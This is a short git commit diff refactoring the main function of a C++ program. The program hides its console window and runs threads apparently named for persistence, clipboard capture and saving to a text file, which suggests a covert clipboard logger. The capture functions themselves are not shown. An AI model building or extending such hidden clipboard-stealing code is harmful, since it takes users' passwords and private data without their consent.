28eafc3f29b733e8bb8a6c6234c784546e60ab93
Regis1488 <82665748+Regis1488@users.noreply.github.com>
2022-11-04 23:23:26 +0100

    Update Main.cpp

--- Program/Main.cpp
+++ Program/Main.cpp
@@ -3,19 +3,18 @@
 
 int main()
 {
-	ShowWindow(GetConsoleWindow(), SW_HIDE);
+ShowWindow(GetConsoleWindow(), SW_HIDE);
+
+std::thread t[3];
+
+t[0] = std::thread(PersistantApplication);
+t[1] = std::thread(clipboard);
+t[2] = std::thread(saveInTextFile);
 	
-    	std::thread t1;
-	std::thread t2;
-	std::thread t3;
+for (int i = 0; i <= 2; i++) {
+	t[i].join();
+}
 
-	t1 = std::thread(PersistantApplication);
-	t2 = std::thread(clipboard);
-	t3 = std::thread(saveInTextFile);
-
-	t1.join();
-	t2.join();
-	t3.join();
-
-	return 0;
+return 0;
+	
 }
